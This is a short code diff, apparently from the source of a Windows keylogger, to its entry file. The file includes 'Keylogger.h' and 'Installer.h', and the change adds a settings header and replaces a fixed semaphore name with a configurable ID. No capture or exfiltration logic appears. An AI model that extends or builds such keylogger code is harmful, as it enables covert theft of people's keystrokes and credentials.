@@ -1,9 +1,10 @@
 #include "stdafx.h"
 #include "Keylogger.h"
+#include "Settings.h"
 #include "Installer.h"
 
 
-TCHAR semName[] = _T("VSem");
+TCHAR semName[] = V_UNIQUE_ID;
 
 extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
 {
